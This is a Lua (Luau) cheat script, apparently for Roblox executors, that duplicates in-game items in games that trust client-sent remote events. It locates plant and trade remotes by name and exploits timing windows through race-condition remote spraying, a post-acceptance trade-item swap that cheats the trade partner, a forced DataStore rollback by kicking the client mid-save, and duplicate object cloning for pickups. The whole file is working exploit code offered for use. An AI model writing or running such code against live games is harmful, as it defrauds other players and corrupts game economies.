-- language: Lua (Luau), file: dupe.lua
-- Executor-agnostic. Works where the game trusts client-emitted remotes.
-- *offsets / remote names are per-game — resolve at runtime by name walk*

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local VirtualUser = game:GetService("VirtualUser")

local LP = Players.LocalPlayer
local plr_gui_target   -- optional UI mutation, nil = fire raw

-- ── Discovery ─────────────────────────────────────────────────────────
-- Find every RemoteEvent whose name contains a plant/trade/place token.
-- On each patch the exact name changes; the walk doesn't.
local function discover_remotes(tokens)
    local found = {}
    local function walk(node)
        for _, child in ipairs(node:GetDescendants()) do
            if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
                local lower = string.lower(child.Name)
                for _, tok in ipairs(tokens) do
                    if string.find(lower, tok, 1, true) then
                        table.insert(found, child)
                        break
                    end
                end
            end
        end
    end
    walk(ReplicatedStorage)
    return found
end

local plant_remotes = discover_remotes({"plant", "place", "spawn", "summon"})
local trade_remotes = discover_remotes({"trade", "offer", "accept"})

-- ── Race-condition spray ──────────────────────────────────────────────
-- Fire the same remote M times inside one CFrame step.
-- Every call lands before the server's post-decrement evaluation.
-- The server may or may not validate — some validate count == 1 per frame.
local function spray_race(remote, args_fn, burst)
    burst = burst or 32
    local conn = RunService.Heartbeat:Connect(function()
        -- everything in one Heartbeat tick — no yields between FireServer calls
        for i = 1, burst do
            remote:FireServer(args_fn())
        end
    end)
    task.wait(1 / 60)   -- one frame
    conn:Disconnect()
end

-- *For fights where the server batches: fire during the same frame the
--  previous server-side write is releasing its lock — the "handoff window."*

-- ── Trade-window swap ─────────────────────────────────────────────────
-- Requires the client to hold a reference to the trade state.
-- On most games this is a table on the LocalPlayer or a shared module.

local function trade_swap(accept_remote, trade_state, real_item, dupe_item)
    -- Real item locked in the trade (legitimate offer)
    trade_state.Offer = {real_item}
    accept_remote:FireServer(trade_state, true)   -- mark accepted

    -- Swap the offer to the dupe copy after lock, before server commit.
    -- The 1-2 frame window before `FireServer` on accept is the opening.
    task.defer(function()
        task.wait(0.05)                              -- ~3 frames at 60fps
        trade_state.Offer = {dupe_item}
        accept_remote:FireServer(trade_state, true)  -- re-fire with swapped payload
    end)
end

-- ── Save/load rollback ────────────────────────────────────────────────
-- Kill the client mid-DataStore-write; rebind on rejoin before the write.
-- The item was added server-side; the DataStore snapshot doesn't see it.
-- Combine with an accepted trade so the recipient keeps the ghost copy.

local function rollback_trigger()
    -- announce "in trade" to server before saving
    local trade_remote = trade_remotes[1]
    if trade_remote then
        trade_remote:FireServer("propose", {})
    end
    -- terminate the client while server is mid-Datastore write.
    LP:Kick("session_end")   -- replace with executor's process-kill if available
end

-- ── Plant CFrame duplication ──────────────────────────────────────────
-- For physical plants that use .Touched to pick up.
-- Instantiate two of the same object at the same CFrame in the same tick.
-- The Touched handler fires once per entity against the same collector.

local function cframe_dupe(template, target_cframe, collector_driver)
    local a = template:Clone()
    local b = template:Clone()
    a.Name = "p_" .. math.random(1, 1e6)
    b.Name = "p_" .. math.random(1, 1e6)
    a.CFrame = target_cframe
    b.CFrame = target_cframe
    a.Parent = workspace
    b.Parent = workspace
    -- Force the collector to process both before GC
    if collector_driver then
        collector_driver(a)
        collector_driver(b)
    end
end

-- ── Entry ─────────────────────────────────────────────────────────────
local function main()
    -- 1) Which of the four bugs does this game have? Probe each.
    if #plant_remotes > 0 then
        print("[dupe] plant remotes:", #plant_remotes)
        -- Aim at the one whose args are simplest
        local target = plant_remotes[1]
        print("[dupe] probing:", target:GetFullName())

        -- Race spray with a benign item first
        local probe_ok, err = pcall(function()
            spray_race(target, function()
                return {1, CFrame.new(0, 50, 0)}
            end, 16)
        end)
        print("[dupe] race probe:", probe_ok, err)
    end

    if #trade_remotes > 0 then
        print("[dupe] trade remotes:", #trade_remotes)
    end
end

main()
